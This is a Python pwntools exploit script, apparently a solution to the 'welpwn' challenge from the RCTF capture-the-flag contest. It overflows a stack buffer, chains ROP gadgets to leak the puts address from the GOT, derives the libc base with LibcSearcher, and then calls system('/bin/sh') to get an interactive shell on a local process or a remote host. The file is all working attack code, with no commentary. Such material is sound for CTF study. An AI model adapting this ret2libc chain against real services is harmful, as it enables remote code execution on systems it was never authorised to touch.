#!/usr/bin/env python3
from pwn import *
from LibcSearcher import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./welpwn"

# x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008a3 : pop rdi ; ret
def exp(io):
    elf = ELF(localfile)
    puts_got = elf.got["puts"]
    puts_plt = elf.plt["puts"]
    main = elf.symbols["main"]
    io.recvuntil("RCTF\n")
    payload1 = b"A" * 0x18 + p64(0x40089c) + p64(0x4008a3) + p64(puts_got) + p64(puts_plt) + p64(main)
    io.send(payload1)

    io.recvuntil("\x9c\x08\x40")
    puts_addr = u64(io.recv(6).ljust(8, b'\x00'))

    log.debug("puts addr: 0x%8x" % puts_addr)
    libc = LibcSearcher("puts", puts_addr)
    libc_base = puts_addr - libc.dump("puts")
    log.debug("libc base: 0x%8x" % libc_base)
    system_addr = libc_base + libc.dump("system")
    str_bin_sh = libc_base + libc.dump("str_bin_sh")

    payload2 = b"A" * 0x18 + p64(0x40089c) + p64(0x4008a3) + p64(str_bin_sh) + p64(system_addr)
    # io.recvuntil("RCTF\n")
    # gdb.attach(io, "b *0x4007cc")
    io.send(payload2)
    
    io.interactive()

if len(sys.argv) == 1:
    io = process(localfile)
elif len(sys.argv) == 2:
    host, port = sys.argv[1].split(":")
    io = remote(host, port)
elif len(sys.argv) == 3:
    host = sys.argv[1]
    port = sys.argv[2]
    io = remote(host, port)

exp(io)